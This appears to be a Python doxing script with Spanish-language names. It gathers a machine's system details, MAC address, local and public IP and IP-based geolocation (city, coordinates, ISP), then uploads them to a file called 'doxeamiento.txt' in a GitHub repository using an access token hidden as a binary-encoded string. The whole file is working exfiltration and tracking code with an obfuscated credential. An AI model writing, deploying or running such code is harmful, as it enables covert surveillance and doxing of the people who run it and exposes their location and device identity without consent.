import requests
import base64
import json
import platform
import socket
import psutil
import uuid
import json
class github:
    def __init__(self, token, owner, repo, branch="main"):
        self.token = token
        self.owner = owner
        self.repo = repo
        self.branch = branch
        self.headers = {'Authorization': f'token {self.token}'}
    def get(self, file_path):
        url = f'https://api.github.com/repos/{self.owner}/{self.repo}/contents/{file_path}?ref={self.branch}'
        response = requests.get(url, headers=self.headers)
        if response.status_code == 200:
            file_data = response.json()
            return base64.b64decode(file_data['content']).decode('utf-8'), file_data['sha']
        return None, None
    def write(self, file_path, new_content):
        content, sha = self.get(file_path)
        if sha:
            url = f'https://api.github.com/repos/{self.owner}/{self.repo}/contents/{file_path}'
            encoded_content = base64.b64encode(new_content.encode('utf-8')).decode('utf-8')
            data = {"message": f"Actualizando {file_path}", "content": encoded_content, "sha": sha}
            response = requests.put(url, headers=self.headers, data=json.dumps(data))
            return response.status_code == 200
        return False
def gip():
    try:
        return requests.get("https://api64.ipify.org?format=json").json()["ip"]
    except:
        return None
def gloc(ip):
    try:
        # Intentar con ipapi.co
        response = requests.get(f"https://ipapi.co/{ip}/json/")
        data = response.json()
        if "error" in data:
            raise Exception("ipapi.co falló")

        return {
            "País": data.get("country_name"),
            "Ciudad": data.get("city"),
            "Latitud": data.get("latitude"),
            "Longitud": data.get("longitude"),
            "ISP": data.get("org")
        }
    except:
        try:
            # Intentar con ipinfo.io si ipapi.co falla
            response = requests.get(f"https://ipinfo.io/{ip}/json")
            data = response.json()
            if "bogon" in data:  # IP privada/no rastreable
                return None

            lat, lon = data.get("loc", ",").split(",")
            return {
                "País": data.get("country"),
                "Ciudad": data.get("city"),
                "Latitud": lat,
                "Longitud": lon,
                "ISP": data.get("org")
            }
        except:
            return None
def gsys():
    ip_publica = gip()
    ubicacion = gloc(ip_publica) if ip_publica else None
    info = {
        "Sistema Operativo": platform.system(),
        "Versión del SO": platform.version(),
        "Nombre del SO": platform.platform(),
        "Arquitectura": platform.architecture(),
        "Procesador": platform.processor(),
        "Núcleos Físicos": psutil.cpu_count(logical=False),
        "Núcleos Totales": psutil.cpu_count(logical=True),
        "RAM Total (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
        "Dirección MAC": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1]),
        "Nombre del Dispositivo": platform.node(),
        "IP Local": socket.gethostbyname(socket.gethostname()),
        "IP Pública": ip_publica,
        "Ubicación": ubicacion if ubicacion else "No disponible"
    }
    return info
def tb(binario):
    return ''.join(chr(int(binario[i:i+8], 2)) for i in range(0, len(binario), 8))
api='01100111011010000111000001011111011101110101010001100101011110000111100101100001011011100100001101001100011001000101010000110100010110000100101001110101010101100011001101010111010101100111010000111000011110000100110001100100010100000110111101101100011110000100100001101101001100110100101001110110001100010011010101011010'
tokensito = tb(api)
github = github(token=tokensito, owner='mrmorcilla', repo='python')
system_info = gsys()
texto=json.dumps(system_info, indent=4, ensure_ascii=False)
res=github.write('doxeamiento.txt',texto)
print(res)
print(github.get('doxeamiento.txt'))
